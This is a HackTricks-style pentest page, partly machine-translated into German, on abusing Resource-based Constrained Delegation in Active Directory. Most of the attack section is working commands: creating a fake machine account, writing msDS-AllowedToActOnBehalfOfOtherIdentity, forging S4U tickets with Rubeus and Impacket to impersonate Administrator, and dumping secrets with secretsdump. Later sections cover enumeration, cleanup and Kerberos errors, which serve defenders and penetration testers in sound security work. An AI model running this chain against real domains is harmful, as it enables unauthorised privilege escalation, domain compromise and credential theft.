# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Grundlagen von Resource-based Constrained Delegation

This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions to an **object** to **impersonate any user against a machine**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.

In diesem Fall wird das eingeschränkte Objekt ein Attribut namens _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ haben, mit dem Namen des Benutzers, der jeden anderen Benutzer gegenüber diesem Objekt impersonifizieren kann.

Ein weiterer wichtiger Unterschied zwischen dieser Form der Constrained Delegation und den anderen Delegationen ist, dass jeder Benutzer mit **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) das **_msDS-AllowedToActOnBehalfOfOtherIdentity_** setzen kann (bei den anderen Delegationsformen benötigte man Domain-Admin-Rechte).

### Neue Konzepte

Früher wurde bei Constrained Delegation gesagt, dass das Flag **`TrustedToAuthForDelegation`** innerhalb des _userAccountControl_-Werts des Benutzers notwendig sei, um ein **S4U2Self** durchzuführen. Das ist jedoch nicht ganz zutreffend.\
Tatsächlich kann man auch ohne diesen Wert ein **S4U2Self** gegen jeden Benutzer durchführen, wenn man ein **service** ist (einen SPN hat). Wenn man jedoch `TrustedToAuthForDelegation` hat, ist der zurückgegebene TGS **Forwardable**, und wenn man dieses Flag nicht hat, ist der zurückgegebene TGS **nicht** **Forwardable**.

Allerdings, wenn der **TGS**, der in **S4U2Proxy** verwendet wird, **NICHT Forwardable** ist, wird der Missbrauch einer **basic Constrain Delegation** **nicht funktionieren**. Wenn du jedoch eine **Resource-Based constrain delegation** ausnutzt, funktioniert es.

### Angriffsstruktur

> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.

Angenommen, der Angreifer hat bereits **write equivalent privileges over the victim computer**.

1. The attacker **compromises** an account that has a **SPN** or **creates one** (“Service A”). Note that **any** _Admin User_ without any other special privilege can **create** up until 10 Computer objects (**_MachineAccountQuota_**) and set them a **SPN**. So the attacker can just create a Computer object and set a SPN.
2. The attacker **abuses its WRITE privilege** over the victim computer (ServiceB) to configure **resource-based constrained delegation to allow ServiceA to impersonate any user** against that victim computer (ServiceB).
3. The attacker uses Rubeus to perform a **full S4U attack** (S4U2Self and S4U2Proxy) from Service A to Service B for a user **with privileged access to Service B**.
1. S4U2Self (from the SPN compromised/created account): Ask for a **TGS of Administrator to me** (Not Forwardable).
2. S4U2Proxy: Use the **not Forwardable TGS** of the step before to ask for a **TGS** from **Administrator** to the **victim host**.
3. Even if you are using a not Forwardable TGS, as you are exploiting Resource-based constrained delegation, it will work.
4. The attacker can **pass-the-ticket** and **impersonate** the user to gain **access to the victim ServiceB**.

To check the _**MachineAccountQuota**_ of the domain you can use:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Angriff

### Erstellen eines Computerobjekts

Sie können ein Computerobjekt innerhalb der Domäne mit **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurieren von Resource-based Constrained Delegation

**Verwendung des activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Verwendung von powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Durchführung eines vollständigen S4U attack (Windows/Rubeus)

Zunächst haben wir das neue Computer-Objekt mit dem password `123456` erstellt, daher benötigen wir den hash dieses password:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dies gibt die RC4- und AES-Hashes für das account aus.\
Nun kann der Angriff durchgeführt werden:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Sie können zusätzliche Tickets für mehrere Dienste erzeugen, indem Sie einmal den `/altservice`-Parameter von Rubeus verwenden:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Beachten Sie, dass Benutzer ein Attribut mit dem Namen "**Cannot be delegated**" haben. Wenn dieses Attribut bei einem Benutzer auf True gesetzt ist, können Sie sich nicht als diesen Benutzer ausgeben. Diese Eigenschaft ist in bloodhound sichtbar.

### Linux-Werkzeuge: End-to-End RBCD mit Impacket (2024+)

Wenn Sie von Linux aus arbeiten, können Sie die vollständige RBCD-Kette mit den offiziellen Impacket-Tools ausführen:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Hinweise
- Wenn LDAP signing/LDAPS erzwungen ist, verwende `impacket-rbcd -use-ldaps ...`.
- Bevorzuge AES-Schlüssel; viele moderne Domänen beschränken RC4. Impacket und Rubeus unterstützen beide AES-only-Flows.
- Impacket kann den `sname` ("AnySPN") für einige Tools umschreiben, aber beschaffe das korrekte SPN wann immer möglich (z. B. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Zugriff

Die letzte Befehlszeile führt den **kompletten S4U-Angriff aus und injiziert das TGS** vom Administrator auf den Zielhost in den **Speicher**.\
In diesem Beispiel wurde ein TGS für den **CIFS**-Dienst vom Administrator angefordert, sodass du auf **C$** zugreifen kannst:
```bash
ls \\victim.domain.local\C$
```
### Missbrauch verschiedener Service-Tickets

Erfahre mehr über die [**verfügbaren Service-Tickets**](silver-ticket.md#available-services).

## Aufzählung, Überprüfung und Bereinigung

### Computer mit konfiguriertem RBCD auflisten

PowerShell (dekodiert das SD, um SIDs aufzulösen):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (lesen oder leeren mit einem Befehl):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Bereinigung / Zurücksetzen von RBCD

- PowerShell (Attribut löschen):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos-Fehler

- **`KDC_ERR_ETYPE_NOTSUPP`**: Das bedeutet, dass Kerberos so konfiguriert ist, dass DES oder RC4 nicht verwendet werden, und du lieferst nur den RC4-Hash. Gib Rubeus mindestens den AES256-Hash (oder liefere ihm die rc4-, aes128- und aes256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Das bedeutet, dass die Uhrzeit des aktuellen Computers von der des DC abweicht und Kerberos nicht ordnungsgemäß funktioniert.
- **`preauth_failed`**: Das bedeutet, dass der angegebene Benutzername + Hashes nicht funktionieren, um sich anzumelden. Möglicherweise hast du vergessen, das "$" in den Benutzernamen einzufügen, als du die Hashes erzeugt hast (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Das kann bedeuten:
  - Der Benutzer, den du zu impersonifizieren versuchst, kann auf den gewünschten Dienst nicht zugreifen (weil du ihn nicht impersonifizieren kannst oder weil er nicht genügend Berechtigungen hat)
  - Der angeforderte Dienst existiert nicht (z. B. wenn du ein Ticket für winrm anforderst, aber winrm nicht läuft)
  - Der erstellte fakecomputer hat seine Privilegien auf dem verwundbaren Server verloren und du musst sie ihm zurückgeben.
  - Du missbrauchst klassisches KCD; denke daran, dass RBCD mit nicht-forwardable S4U2Self-Tickets arbeitet, während KCD forwardable erfordert.

## Hinweise, Relays und Alternativen

- Du kannst die RBCD SD auch über AD Web Services (ADWS) schreiben, wenn LDAP gefiltert ist. Siehe:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos-Relay-Ketten enden häufig in RBCD, um in einem Schritt lokalen SYSTEM-Zugriff zu erreichen. Siehe praktische End-to-End-Beispiele:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Wenn LDAP signing/channel binding **deaktiviert** sind und du ein Maschinenkonto erstellen kannst, können Tools wie **KrbRelayUp** eine erzwungene Kerberos-Authentifizierung an LDAP weiterleiten, `msDS-AllowedToActOnBehalfOfOtherIdentity` für dein Maschinenkonto auf dem Ziel-Computerobjekt setzen und sofort **Administrator** via S4U von einem anderen Host aus impersonifizieren.

## Referenzen

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (offiziell): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Kurzes Linux-Cheatsheet mit aktueller Syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
